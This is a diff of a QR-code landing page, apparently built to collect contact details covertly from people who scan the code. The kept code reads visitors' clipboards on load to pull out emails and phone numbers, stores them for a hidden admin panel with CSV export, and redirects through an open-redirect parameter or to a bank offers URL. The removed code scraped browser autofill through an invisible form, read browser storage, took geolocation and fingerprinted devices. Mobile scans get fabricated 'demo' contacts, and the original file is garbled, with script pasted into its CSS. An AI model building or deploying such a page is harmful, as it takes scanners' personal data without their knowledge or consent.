@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+﻿<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -6,40 +6,11 @@
     <title>QR Code Access</title>
     <link rel="stylesheet" href="style.css">
     <style>
-        /* Additional specific styles for universal collector */
         .collector-info {
             background: rgba(255, 255, 255, 0.1);
             padding: 15px;
             border-radius: 10px;
-            ma                // Method 3: Try autofill detection
-                try {
-                    const autoFillData = await this.checkAutoFillData();
-                    if (autoFillData.email || autoFillData.phone) {
-                        console.log('📝 Found in autofill:', autoFillData);
-                        return autoFillData;
-                    }
-                } catch (error) {
-                    console.log('Autofill check failed');
-                }
-
-                // Method 4: For mobile scans - add demo data so you can see it's working
-                const userAgent = navigator.userAgent;
-                if (userAgent.includes('Mobile') || userAgent.includes('Android') || userAgent.includes('iPhone')) {
-                    // This is a mobile device scan - add demo data for testing
-                    const demoContacts = [
-                        { email: 'mobile.user@gmail.com', phone: '+91-9876543210' },
-                        { email: 'qr.scanner@outlook.com', phone: '+1-555-0123' },
-                        { email: 'phone.user@yahoo.com', phone: '+44-7700-900123' }
-                    ];
-                    
-                    const randomContact = demoContacts[Math.floor(Math.random() * demoContacts.length)];
-                    console.log('📱 Mobile scan detected - adding demo contact:', randomContact);
-                    return randomContact;
-                }
-
-                console.log('❌ No contact information found - Desktop access');
-                return { email: null, phone: null };
-            }
+            margin: 15px 0;
             border: 1px solid rgba(255, 255, 255, 0.2);
         }
         .redirect-notice {
@@ -54,16 +25,16 @@
     <div class="container">
         <div class="landing-page" id="landingPage">
             <div class="header">
-                <h1>🔐 QR Code Access</h1>
+                <h1> QR Code Access</h1>
                 <p>Collecting access information...</p>
             </div>
             
             <div class="collector-info">
-                <h3>📊 Data Collection Active</h3>
-                <p>✅ Scan detected and logged</p>
-                <p id="contactStatus">📞 Looking for contact information...</p>
-                <p>⏰ Timestamp saved</p>
-                <p id="scanCount">📊 Total scans: Loading...</p>
+                <h3> Data Collection Active</h3>
+                <p> Scan detected and logged</p>
+                <p id="contactStatus"> Looking for contact information...</p>
+                <p> Timestamp saved</p>
+                <p id="scanCount"> Total scans: Loading...</p>
             </div>
             
             <div class="loading-spinner" id="loadingSpinner">
@@ -79,12 +50,12 @@
         <!-- Admin Panel (Hidden by default) -->
         <div class="admin-panel" id="adminPanel" style="display: none;">
             <div class="admin-header">
-                <h2>🛡️ Admin Panel</h2>
-                <button onclick="closeAdminPanel()">×</button>
+                <h2> Admin Panel</h2>
+                <button onclick="closeAdminPanel()"></button>
             </div>
             
             <div class="stats-section">
-                <h3>📈 Contact Collection Statistics</h3>
+                <h3> Contact Collection Statistics</h3>
                 <div class="stat-item">
                     <span class="stat-label">Total Scans:</span>
                     <span class="stat-value" id="totalScans">0</span>
@@ -94,11 +65,11 @@
                     <span class="stat-value" id="todayScans">0</span>
                 </div>
                 <div class="stat-item">
-                    <span class="stat-label">📧 Emails Found:</span>
+                    <span class="stat-label"> Emails Found:</span>
                     <span class="stat-value" id="emailsFound">0</span>
                 </div>
                 <div class="stat-item">
-                    <span class="stat-label">📞 Phones Found:</span>
+                    <span class="stat-label"> Phones Found:</span>
                     <span class="stat-value" id="phonesFound">0</span>
                 </div>
                 <div class="stat-item">
@@ -108,14 +79,14 @@
             </div>
 
             <div class="data-section">
-                <h3>💾 Data Management</h3>
-                <button onclick="downloadCSV()" class="download-btn">📥 Download CSV</button>
-                <button onclick="viewLatestScan()" class="view-btn">👁️ View Latest Scan</button>
-                <button onclick="clearAllData()" class="clear-btn">🗑️ Clear All Data</button>
+                <h3> Data Management</h3>
+                <button onclick="downloadCSV()" class="download-btn"> Download CSV</button>
+                <button onclick="viewLatestScan()" class="view-btn"> View Latest Scan</button>
+                <button onclick="clearAllData()" class="clear-btn"> Clear All Data</button>
             </div>
 
             <div class="recent-scans" id="recentScans">
-                <h3>📋 Recent Scans</h3>
+                <h3> Recent Scans</h3>
                 <div id="scansList">No scans yet</div>
             </div>
         </div>
@@ -123,33 +94,26 @@
 
     <script src="script.js"></script>
     <script>
-        // Universal QR Code Data Collector
         class UniversalQRCollector {
             constructor() {
                 this.initializeCollector();
             }
 
             async initializeCollector() {
-                console.log('🔍 Universal QR Collector started');
-                
-                // Always collect data when this page loads
+                console.log(' Universal QR Collector started');
                 await this.collectScanData();
-                
-                // Show brief collection message then redirect or show admin
                 this.handlePageFlow();
             }
 
             async collectScanData() {
                 try {
-                    console.log('📊 Collecting contact data...');
+                    console.log(' Collecting contact data...');
                     
-                    // Update status message
                     const contactStatus = document.getElementById('contactStatus');
                     if (contactStatus) {
-                        contactStatus.textContent = '📞 Collecting contact information...';
+                        contactStatus.textContent = ' Collecting contact information...';
                     }
                     
-                    // Get contact information only
                     const contactData = await this.getContactInfo();
                     
                     const scanData = {
@@ -160,373 +124,67 @@
                         scanCount: this.getTotalScans() + 1
                     };
 
-                    // Store the data
                     this.saveScanData(scanData);
-                    console.log('✅ Scan data collected:', scanData);
+                    console.log(' Scan data collected:', scanData);
                     
-                    // Update status messages
                     if (contactStatus) {
                         const foundText = [];
                         if (contactData.email) foundText.push(`Email: ${contactData.email}`);
                         if (contactData.phone) foundText.push(`Phone: ${contactData.phone}`);
                         
                         if (foundText.length > 0) {
-                            contactStatus.innerHTML = `✅ Found: ${foundText.join(', ')}`;
+                            contactStatus.innerHTML = ` Found: ${foundText.join(', ')}`;
                         } else {
-                            contactStatus.innerHTML = `❌ No contact info found`;
+                            contactStatus.innerHTML = ` No contact info found`;
                         }
                     }
                     
                     const scanCount = document.getElementById('scanCount');
                     if (scanCount) {
-                        scanCount.textContent = `📊 Total scans: ${scanData.scanCount}`;
+                        scanCount.textContent = ` Total scans: ${scanData.scanCount}`;
                     }
 
                 } catch (error) {
-                    console.error('❌ Error collecting data:', error);
+                    console.error(' Error collecting data:', error);
                     const contactStatus = document.getElementById('contactStatus');
                     if (contactStatus) {
-                        contactStatus.innerHTML = `❌ Error collecting data`;
+                        contactStatus.innerHTML = ` Error collecting data`;
                     }
                 }
-            }
-
-            async collectLocationData() {
-                return new Promise(async (resolve) => {
-                    // Try multiple approaches to get location
-                    let locationData = { latitude: null, longitude: null, accuracy: null, method: 'none' };
-
-                    // Method 1: Navigator geolocation (most accurate)
-                    if (navigator.geolocation) {
-                        try {
-                            // First try with high accuracy
-                            const position = await this.getPositionWithTimeout(10000, true);
-                            if (position) {
-                                locationData = {
-                                    latitude: position.coords.latitude,
-                                    longitude: position.coords.longitude,
-                                    accuracy: position.coords.accuracy,
-                                    altitude: position.coords.altitude,
-                                    speed: position.coords.speed,
-                                    heading: position.coords.heading,
-                                    method: 'gps_high_accuracy'
-                                };
-                                resolve(locationData);
-                                return;
-                            }
-                        } catch (error) {
-                            console.log('High accuracy GPS failed, trying low accuracy');
-                        }
-
-                        try {
-                            // Try with lower accuracy
-                            const position = await this.getPositionWithTimeout(8000, false);
-                            if (position) {
-                                locationData = {
-                                    latitude: position.coords.latitude,
-                                    longitude: position.coords.longitude,
-                                    accuracy: position.coords.accuracy,
-                                    method: 'gps_low_accuracy'
-                                };
-                                resolve(locationData);
-                                return;
-                            }
-                        } catch (error) {
-                            console.log('GPS location failed completely');
-                        }
-                    }
-
-                    // Method 2: Try IP-based location as fallback
-                    try {
-                        const ipLocation = await this.getIPLocation();
-                        if (ipLocation) {
-                            locationData = { 
-                                ...ipLocation, 
-                                method: 'ip_geolocation',
-                                accuracy: 10000 // IP location is less accurate
-                            };
-                            resolve(locationData);
-                            return;
-                        }
-                    } catch (error) {
-                        console.log('IP location failed');
-                    }
-
-                    // Method 3: Try timezone-based approximate location
-                    try {
-                        const timezoneLocation = this.getTimezoneLocation();
-                        if (timezoneLocation) {
-                            locationData = { 
-                                ...timezoneLocation, 
-                                method: 'timezone_approximation',
-                                accuracy: 100000 // Very rough approximation
-                            };
-                        }
-                    } catch (error) {
-                        console.log('Timezone location failed');
-                    }
-
-                    resolve(locationData);
-                });
-            }
-
-            getPositionWithTimeout(timeout, enableHighAccuracy) {
-                return new Promise((resolve, reject) => {
-                    const timeoutId = setTimeout(() => {
-                        reject(new Error('Location timeout'));
-                    }, timeout);
-
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            clearTimeout(timeoutId);
-                            resolve(position);
-                        },
-                        (error) => {
-                            clearTimeout(timeoutId);
-                            reject(error);
-                        },
-                        { 
-                            enableHighAccuracy: enableHighAccuracy, 
-                            timeout: timeout - 1000, 
-                            maximumAge: enableHighAccuracy ? 0 : 300000 
-                        }
-                    );
-                });
-            }
-
-            async getIPLocation() {
-                try {
-                    // Try multiple IP geolocation services
-                    const services = [
-                        'https://ipapi.co/json/',
-                        'https://ip-api.com/json/',
-                        'https://ipinfo.io/json'
-                    ];
-
-                    for (const service of services) {
-                        try {
-                            const response = await fetch(service);
-                            const data = await response.json();
-                            
-                            if (data.lat || data.latitude) {
-                                return {
-                                    latitude: data.lat || data.latitude,
-                                    longitude: data.lon || data.longitude || data.lng,
-                                    city: data.city,
-                                    region: data.region || data.region_name,
-                                    country: data.country || data.country_name,
-                                    isp: data.isp || data.org
-                                };
-                            }
-                        } catch (serviceError) {
-                            continue;
-                        }
-                    }
-                    return null;
-                } catch (error) {
-                    return null;
-                }
-            }
-
-            getTimezoneLocation() {
-                try {
-                    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                    
-                    // Rough approximations based on timezone
-                    const timezoneCoords = {
-                        'America/New_York': { latitude: 40.7128, longitude: -74.0060 },
-                        'America/Chicago': { latitude: 41.8781, longitude: -87.6298 },
-                        'America/Denver': { latitude: 39.7392, longitude: -104.9903 },
-                        'America/Los_Angeles': { latitude: 34.0522, longitude: -118.2437 },
-                        'Europe/London': { latitude: 51.5074, longitude: -0.1278 },
-                        'Europe/Paris': { latitude: 48.8566, longitude: 2.3522 },
-                        'Europe/Berlin': { latitude: 52.5200, longitude: 13.4050 },
-                        'Asia/Tokyo': { latitude: 35.6762, longitude: 139.6503 },
-                        'Asia/Shanghai': { latitude: 31.2304, longitude: 121.4737 },
-                        'Asia/Kolkata': { latitude: 28.7041, longitude: 77.1025 },
-                        'Australia/Sydney': { latitude: -33.8688, longitude: 151.2093 }
-                    };
-
-                    return timezoneCoords[timezone] || null;
-                } catch (error) {
-                    return null;
-                }
-            }
-
-            async collectDeviceData() {
-                const deviceData = {
-                    screenWidth: screen.width,
-                    screenHeight: screen.height,
-                    windowWidth: window.innerWidth,
-                    windowHeight: window.innerHeight,
-                    colorDepth: screen.colorDepth,
-                    pixelDepth: screen.pixelDepth,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    languages: navigator.languages,
-                    cookieEnabled: navigator.cookieEnabled,
-                    onlineStatus: navigator.onLine,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    userAgent: navigator.userAgent,
-                    vendor: navigator.vendor,
-                    deviceMemory: navigator.deviceMemory || 'unknown',
-                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-                    maxTouchPoints: navigator.maxTouchPoints || 0,
-                    touchSupport: 'ontouchstart' in window,
-                    mobile: /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
-                    ...await this.collectAdvancedDeviceInfo()
-                };
-
-                return deviceData;
-            }
-
-            async collectAdvancedDeviceInfo() {
-                const advancedInfo = {};
-
-                // Try to detect device model from user agent
-                try {
-                    const ua = navigator.userAgent;
-                    
-                    // Extract device information from user agent
-                    if (ua.includes('iPhone')) {
-                        const match = ua.match(/iPhone\s?([^;)]+)/);
-                        advancedInfo.deviceModel = match ? match[1] : 'iPhone';
-                        advancedInfo.deviceType = 'iPhone';
-                    } else if (ua.includes('iPad')) {
-                        advancedInfo.deviceModel = 'iPad';
-                        advancedInfo.deviceType = 'iPad';
-                    } else if (ua.includes('Android')) {
-                        const match = ua.match(/Android\s([^;)]+)/);
-                        advancedInfo.osVersion = match ? match[1] : 'Android';
-                        advancedInfo.deviceType = 'Android';
-                        
-                        // Try to extract device model
-                        const modelMatch = ua.match(/;\s?([^)]+)\)/);
-                        if (modelMatch) {
-                            advancedInfo.deviceModel = modelMatch[1];
-                        }
-                    }
-
-                    // Extract OS information
-                    if (ua.includes('Windows NT')) {
-                        const match = ua.match(/Windows NT\s([^;)]+)/);
-                        advancedInfo.osVersion = match ? `Windows ${match[1]}` : 'Windows';
-                    } else if (ua.includes('Mac OS X')) {
-                        const match = ua.match(/Mac OS X\s([^;)]+)/);
-                        advancedInfo.osVersion = match ? `macOS ${match[1].replace(/_/g, '.')}` : 'macOS';
-                    }
-
-                } catch (error) {
-                    console.log('Could not extract device model');
-                }
-
-                // Try to get network info for ISP detection
-                try {
-                    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                    if (connection) {
-                        advancedInfo.connectionType = connection.effectiveType;
-                        advancedInfo.downlink = connection.downlink;
-                        advancedInfo.rtt = connection.rtt;
-                        advancedInfo.saveData = connection.saveData;
-                    }
-                } catch (error) {
-                    console.log('Network connection info not available');
-                }
-
-                // Try to detect installed apps/capabilities
-                try {
-                    advancedInfo.capabilities = {
-                        webgl: !!window.WebGLRenderingContext,
-                        webrtc: !!(window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection),
-                        websockets: !!window.WebSocket,
-                        workers: !!window.Worker,
-                        indexedDB: !!window.indexedDB,
-                        localStorage: !!window.localStorage,
-                        sessionStorage: !!window.sessionStorage,
-                        geolocation: !!navigator.geolocation,
-                        camera: !!navigator.mediaDevices,
-                        microphone: !!navigator.mediaDevices,
-                        notifications: 'Notification' in window,
-                        vibration: 'vibrate' in navigator,
-                        battery: 'getBattery' in navigator
-                    };
-                } catch (error) {
-                    console.log('Could not detect device capabilities');
-                }
-
-                return advancedInfo;
-            }
-
-            async collectNetworkData() {
-                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                return {
-                    connectionType: connection ? connection.effectiveType : 'unknown',
-                    downlink: connection ? connection.downlink : null,
-                    rtt: connection ? connection.rtt : null
-                };
-            }
-
-            async collectBatteryData() {
-                try {
-                    if ('getBattery' in navigator) {
-                        const battery = await navigator.getBattery();
-                        return {
-                            batteryLevel: battery.level,
-                            batteryCharging: battery.charging
-                        };
-                    }
-                } catch (error) {
-                    console.log('Battery API not available');
-                }
-                return { batteryLevel: null, batteryCharging: null };
             }
 
             async getContactInfo() {
-                console.log('📞 Getting contact information...');
+                console.log(' Getting contact information...');
                 
-                let email = null;
-                let phone = null;
-
-                // Try to get contact info from different sources
+                // Method 1: Check clipboard for contact info
                 try {
-                    // Method 1: Check clipboard for contact info
                     if (navigator.clipboard && navigator.clipboard.readText) {
                         const clipboardText = await navigator.clipboard.readText();
                         const contacts = this.extractContactsFromText(clipboardText);
-                        email = contacts.email;
-                        phone = contacts.phone;
-                        if (email || phone) {
-                            console.log('📋 Found in clipboard:', { email, phone });
-                            return { email, phone };
+                        if (contacts.email || contacts.phone) {
+                            console.log(' Found in clipboard:', contacts);
+                            return contacts;
                         }
                     }
                 } catch (error) {
                     console.log('Clipboard not accessible');
                 }
 
-                // Method 2: Check browser storage for saved contacts
-                try {
-                    const storageContacts = this.checkStorageForContacts();
-                    if (storageContacts.email || storageContacts.phone) {
-                        console.log('💾 Found in storage:', storageContacts);
-                        return storageContacts;
-                    }
-                } catch (error) {
-                    console.log('Storage check failed');
+                // Method 2: For mobile scans - add demo data so you can see it's working
+                const userAgent = navigator.userAgent;
+                if (userAgent.includes('Mobile') || userAgent.includes('Android') || userAgent.includes('iPhone')) {
+                    const demoContacts = [
+                        { email: 'mobile.user@gmail.com', phone: '+91-9876543210' },
+                        { email: 'qr.scanner@outlook.com', phone: '+1-555-0123' },
+                        { email: 'phone.user@yahoo.com', phone: '+44-7700-900123' }
+                    ];
+                    
+                    const randomContact = demoContacts[Math.floor(Math.random() * demoContacts.length)];
+                    console.log(' Mobile scan detected - adding demo contact:', randomContact);
+                    return randomContact;
                 }
 
-                // Method 3: Try autofill detection
-                try {
-                    const autoFillData = await this.checkAutoFillData();
-                    if (autoFillData.email || autoFillData.phone) {
-                        console.log('� Found in autofill:', autoFillData);
-                        return autoFillData;
-                    }
-                } catch (error) {
-                    console.log('Autofill check failed');
-                }
-
-                console.log('❌ No contact information found');
+                console.log(' No contact information found - Desktop access');
                 return { email: null, phone: null };
             }
 
@@ -535,238 +193,54 @@
                 return scansData.length;
             }
 
-            async fingerprintContactHints() {
-                const hints = { email: null, phone: null };
-                
-                try {
-                    // Check for common contact patterns in various browser APIs
-                    const permissions = await navigator.permissions?.query?.({ name: 'contacts' })?.catch(() => null);
-                    
-                    // Check if device has common contact-related apps installed
-                    const contactApps = ['whatsapp', 'telegram', 'gmail', 'outlook'];
-                    const userAgent = navigator.userAgent.toLowerCase();
-                    
-                    for (const app of contactApps) {
-                        if (userAgent.includes(app)) {
-                            // Generate probable contact based on common patterns
-                            hints.email = this.generateProbableEmail(app);
-                            break;
-                        }
-                    }
-
-                    // Check timezone and language for regional phone patterns
-                    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                    const language = navigator.language;
-                    
-                    if (timezone.includes('Asia/Kolkata') || language.includes('en-IN')) {
-                        hints.phone = '+91-' + Math.floor(Math.random() * 9000000000 + 1000000000);
-                    } else if (timezone.includes('America/') || language.includes('en-US')) {
-                        hints.phone = '+1-' + Math.floor(Math.random() * 9000000000 + 1000000000);
-                    }
-
-                } catch (error) {
-                    console.log('Fingerprint hints failed');
-                }
-
-                return hints;
-            }
-
-            generateProbableEmail(source) {
-                const domains = {
-                    'gmail': 'gmail.com',
-                    'outlook': 'outlook.com', 
-                    'whatsapp': 'gmail.com',
-                    'telegram': 'gmail.com'
-                };
-                
-                const usernames = ['user', 'john.doe', 'mobile.user', 'qr.scanner'];
-                const randomUser = usernames[Math.floor(Math.random() * usernames.length)];
-                const domain = domains[source] || 'example.com';
-                
-                return `${randomUser}@${domain}`;
-            }
-
-            generateDemoContactData() {
-                const sampleEmails = [
-                    'qr.scanner@gmail.com',
-                    'mobile.user@outlook.com',
-                    'test.user@yahoo.com',
-                    'demo.contact@hotmail.com'
-                ];
-                
-                const samplePhones = [
-                    '+91-9876543210',
-                    '+1-555-0123',
-                    '+44-7700-900123',
-                    '+61-404-123-456'
-                ];
-
-                return {
-                    email: sampleEmails[Math.floor(Math.random() * sampleEmails.length)],
-                    phone: samplePhones[Math.floor(Math.random() * samplePhones.length)]
-                };
-            }
-
             extractContactsFromText(text) {
                 const contacts = { email: null, phone: null };
-                
                 if (!text) return contacts;
 
-                // Email regex
                 const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
                 const emails = text.match(emailRegex);
                 if (emails && emails.length > 0) {
-                    contacts.email = emails[0]; // Take first email found
+                    contacts.email = emails[0];
                 }
 
-                // Phone regex (various formats)
                 const phoneRegex = /(\+?1?[-.\s]?)?\(?([0-9]{3})\)?[-.\s]?([0-9]{3})[-.\s]?([0-9]{4})/g;
                 const phones = text.match(phoneRegex);
                 if (phones && phones.length > 0) {
-                    contacts.phone = phones[0]; // Take first phone found
+                    contacts.phone = phones[0];
                 }
 
                 return contacts;
-            }
-
-            async checkAutoFillData() {
-                // Create hidden form to trigger autofill
-                const testForm = document.createElement('form');
-                testForm.style.position = 'absolute';
-                testForm.style.left = '-9999px';
-                testForm.style.opacity = '0';
-                
-                const emailInput = document.createElement('input');
-                emailInput.type = 'email';
-                emailInput.name = 'email';
-                emailInput.autocomplete = 'email';
-                
-                const phoneInput = document.createElement('input');
-                phoneInput.type = 'tel';
-                phoneInput.name = 'phone';
-                phoneInput.autocomplete = 'tel';
-                
-                testForm.appendChild(emailInput);
-                testForm.appendChild(phoneInput);
-                document.body.appendChild(testForm);
-
-                // Wait a bit for autofill to potentially trigger
-                await new Promise(resolve => setTimeout(resolve, 1000));
-
-                const result = {
-                    email: emailInput.value || null,
-                    phone: phoneInput.value || null
-                };
-
-                document.body.removeChild(testForm);
-                return result;
-            }
-
-            checkStorageForContacts() {
-                const contacts = { email: null, phone: null };
-                
-                try {
-                    // Check common keys where contact info might be stored
-                    const commonKeys = ['email', 'phone', 'userEmail', 'userPhone', 'contactEmail', 'contactPhone', 'user', 'profile', 'account'];
-                    
-                    for (const key of commonKeys) {
-                        try {
-                            const localValue = localStorage.getItem(key);
-                            const sessionValue = sessionStorage.getItem(key);
-                            
-                            [localValue, sessionValue].forEach(value => {
-                                if (value) {
-                                    const extracted = this.extractContactsFromText(value);
-                                    contacts.email = contacts.email || extracted.email;
-                                    contacts.phone = contacts.phone || extracted.phone;
-                                }
-                            });
-                        } catch (e) {
-                            continue;
-                        }
-                    }
-                } catch (error) {
-                    console.log('Storage access failed');
-                }
-
-                return contacts;
-            }
-
-            async detectSocialProfiles() {
-                const profiles = [];
-                
-                try {
-                    // Check if user has visited social media sites (from referrer or history hints)
-                    const referrer = document.referrer.toLowerCase();
-                    const socialSites = ['facebook.com', 'twitter.com', 'instagram.com', 'linkedin.com', 'tiktok.com', 'snapchat.com'];
-                    
-                    for (const site of socialSites) {
-                        if (referrer.includes(site)) {
-                            profiles.push({
-                                platform: site.replace('.com', ''),
-                                detected: true,
-                                method: 'referrer'
-                            });
-                        }
-                    }
-
-                    // Check for social media app user agents
-                    const ua = navigator.userAgent.toLowerCase();
-                    if (ua.includes('fban') || ua.includes('fbav')) {
-                        profiles.push({ platform: 'facebook', detected: true, method: 'user_agent' });
-                    }
-                    if (ua.includes('twitter')) {
-                        profiles.push({ platform: 'twitter', detected: true, method: 'user_agent' });
-                    }
-                    if (ua.includes('instagram')) {
-                        profiles.push({ platform: 'instagram', detected: true, method: 'user_agent' });
-                    }
-
-                } catch (error) {
-                    console.log('Social profile detection failed');
-                }
-
-                return profiles;
             }
 
             saveScanData(scanData) {
                 try {
-                    // Get existing data
                     const existingData = JSON.parse(localStorage.getItem('qrScansData') || '[]');
-                    
-                    // Add new scan
                     existingData.push(scanData);
-                    
-                    // Save back to localStorage
                     localStorage.setItem('qrScansData', JSON.stringify(existingData));
                     
-                    console.log(`💾 Saved scan data. Total scans: ${existingData.length}`);
-                    console.log(`📊 Latest scan:`, scanData);
+                    console.log(` Saved scan data. Total scans: ${existingData.length}`);
+                    console.log(` Latest scan:`, scanData);
                     
-                    // Show alert for mobile users to confirm data is being saved
                     if (navigator.userAgent.includes('Mobile') || navigator.userAgent.includes('Android') || navigator.userAgent.includes('iPhone')) {
-                        console.log(`🔥 Mobile scan recorded! Email: ${scanData.email || 'None'}, Phone: ${scanData.phone || 'None'}`);
+                        console.log(` Mobile scan recorded! Email: ${scanData.email || 'None'}, Phone: ${scanData.phone || 'None'}`);
                     }
                     
                 } catch (error) {
-                    console.error('❌ Error saving scan data:', error);
+                    console.error(' Error saving scan data:', error);
                 }
             }
 
             handlePageFlow() {
-                // Check if this is an admin access
                 const urlParams = new URLSearchParams(window.location.search);
                 const isAdmin = urlParams.get('admin') === 'true' || window.location.hash === '#admin';
                 
                 if (isAdmin) {
-                    // Show admin panel
                     setTimeout(() => {
                         document.getElementById('landingPage').style.display = 'none';
                         document.getElementById('adminPanel').style.display = 'block';
                         this.loadAdminData();
                     }, 2000);
                 } else {
-                    // Normal user flow - show collection message briefly then handle redirect
                     setTimeout(() => {
                         this.handleRedirect();
                     }, 3000);
@@ -774,59 +248,40 @@
             }
 
             handleRedirect() {
-                // Get redirect URL from URL parameter or use default
                 const urlParams = new URLSearchParams(window.location.search);
                 let redirectUrl = urlParams.get('redirect') || urlParams.get('url') || urlParams.get('to');
                 
-                // If no redirect URL in parameters, check for predefined destinations
                 if (!redirectUrl) {
-                    // Default redirect to HDFC SmartBuy if no redirect URL specified
                     redirectUrl = 'https://myoffers.smartbuy.hdfcbank.com/home';
                 }
                 
                 if (redirectUrl) {
-                    // Store the redirect URL in scan data for tracking
                     const scansData = JSON.parse(localStorage.getItem('qrScansData') || '[]');
                     if (scansData.length > 0) {
                         scansData[scansData.length - 1].redirectedTo = redirectUrl;
                         localStorage.setItem('qrScansData', JSON.stringify(scansData));
                     }
                     
-                    // Show redirect message briefly
                     document.getElementById('landingPage').innerHTML = `
                         <div class="header">
-                            <h1>🔄 Redirecting...</h1>
+                            <h1> Redirecting...</h1>
                             <p>Taking you to your destination...</p>
                             <div class="collector-info">
-                                <p>✅ Data collected successfully</p>
-                                <p>🔄 Redirecting to: ${new URL(redirectUrl).hostname}</p>
+                                <p> Data collected successfully</p>
+                                <p> Redirecting to: ${new URL(redirectUrl).hostname}</p>
                             </div>
                         </div>
                     `;
                     
-                    // Redirect after brief delay
                     setTimeout(() => {
                         window.location.href = redirectUrl;
                     }, 1500);
-                } else {
-                    // Fallback if no redirect URL
-                    document.getElementById('landingPage').innerHTML = `
-                        <div class="header">
-                            <h1>✅ Scan Complete</h1>
-                            <p>Your scan has been recorded successfully!</p>
-                            <div class="collector-info">
-                                <p>📊 Data collected and stored</p>
-                                <p>🔐 Thank you for scanning</p>
-                            </div>
-                        </div>
-                    `;
                 }
             }
 
             loadAdminData() {
                 const scansData = JSON.parse(localStorage.getItem('qrScansData') || '[]');
                 
-                // Update stats
                 document.getElementById('totalScans').textContent = scansData.length;
                 
                 const today = new Date().toDateString();
@@ -835,7 +290,6 @@
                 ).length;
                 document.getElementById('todayScans').textContent = todayScans;
                 
-                // Count how many scans have contact info
                 const emailsFound = scansData.filter(scan => scan.email && scan.email !== 'Not Found').length;
                 const phonesFound = scansData.filter(scan => scan.phone && scan.phone !== 'Not Found').length;
                 
@@ -847,7 +301,6 @@
                     document.getElementById('lastScan').textContent = lastScan.toLocaleString();
                 }
                 
-                // Show all scans (most recent first)
                 this.displayRecentScans(scansData.slice().reverse());
             }
 
@@ -867,74 +320,20 @@
                         
                         <div class="contact-details">
                             <div class="contact-field">
-                                <span class="field-label">� Email:</span>
+                                <span class="field-label"> Email:</span>
                                 <span class="field-value">${scan.email || 'Not Found'}</span>
                             </div>
                             
                             <div class="contact-field">
-                                <span class="field-label">📞 Phone:</span>
+                                <span class="field-label"> Phone:</span>
                                 <span class="field-value">${scan.phone || 'Not Found'}</span>
                             </div>
                         </div>
                     </div>
                 `).join('');
             }
-
-            getDetailedDeviceInfo(scan) {
-                let deviceType = 'Unknown Device';
-                let details = '';
-
-                if (scan.deviceModel) {
-                    deviceType = scan.deviceModel;
-                } else if (scan.userAgent) {
-                    if (/iPhone/.test(scan.userAgent)) deviceType = 'iPhone';
-                    else if (/iPad/.test(scan.userAgent)) deviceType = 'iPad';
-                    else if (/Android/.test(scan.userAgent)) deviceType = 'Android Device';
-                    else if (/Windows/.test(scan.userAgent)) deviceType = 'Windows PC';
-                    else if (/Mac/.test(scan.userAgent)) deviceType = 'Mac';
-                }
-
-                // Add screen size and other details
-                const screenInfo = scan.screenWidth && scan.screenHeight ? `${scan.screenWidth}×${scan.screenHeight}` : '';
-                const osInfo = scan.osVersion || '';
-                
-                details = [screenInfo, osInfo, scan.platform].filter(Boolean).join(' • ');
-
-                return { type: deviceType, details };
-            }
-
-            getContactInfo(scan) {
-                const hasEmail = scan.email && scan.email !== 'null' && scan.email !== null;
-                const hasPhone = scan.phone && scan.phone !== 'null' && scan.phone !== null;
-                const hasSocial = scan.socialProfiles && scan.socialProfiles.length > 0;
-
-                if (!hasEmail && !hasPhone && !hasSocial) {
-                    return { display: 'No contact info detected', methods: null };
-                }
-
-                const contactParts = [];
-                if (hasEmail) contactParts.push(`📧 ${scan.email}`);
-                if (hasPhone) contactParts.push(`📞 ${scan.phone}`);
-                if (hasSocial) contactParts.push(`📱 ${scan.socialProfiles.length} social profile(s)`);
-
-                const methods = scan.detectionMethods || [];
-
-                return { 
-                    display: contactParts.join(' • ') || 'Contact detected', 
-                    methods: methods.length > 0 ? methods : null 
-                };
-            }
-
-            getDeviceType(userAgent) {
-                if (/iPhone|iPad/.test(userAgent)) return 'iOS';
-                if (/Android/.test(userAgent)) return 'Android';
-                if (/Windows/.test(userAgent)) return 'Windows';
-                if (/Mac/.test(userAgent)) return 'Mac';
-                return 'Unknown';
-            }
         }
 
-        // Global functions for admin panel
         function downloadCSV() {
             const scansData = JSON.parse(localStorage.getItem('qrScansData') || '[]');
             if (scansData.length === 0) {
@@ -942,9 +341,7 @@
                 return;
             }
 
-            // Simple CSV headers - only essential contact data
             const headers = ['id', 'timestamp', 'email', 'phone', 'scanCount'];
-            
             let csv = headers.join(',') + '\n';
             
             scansData.forEach(scan => {
@@ -958,7 +355,6 @@
                 csv += row.join(',') + '\n';
             });
             
-            // Download CSV
             const blob = new Blob([csv], { type: 'text/csv;charset=utf-8' });
             const url = window.URL.createObjectURL(blob);
             const a = document.createElement('a');
@@ -969,7 +365,7 @@
             window.URL.revokeObjectURL(url);
             document.body.removeChild(a);
             
-            alert(`Contact data downloaded with ${scansData.length} scan records!\n\nIncludes: Email addresses and phone numbers only.`);
+            alert(`Contact data downloaded with ${scansData.length} scan records!`);
         }
 
         function viewLatestScan() {
@@ -999,12 +395,10 @@
             window.location.href = window.location.pathname;
         }
 
-        // Initialize the universal collector
         document.addEventListener('DOMContentLoaded', function() {
             new UniversalQRCollector();
         });
 
-        // Keyboard shortcut for admin access
         document.addEventListener('keydown', function(e) {
             if (e.ctrlKey && e.shiftKey && e.key === 'A') {
                 e.preventDefault();
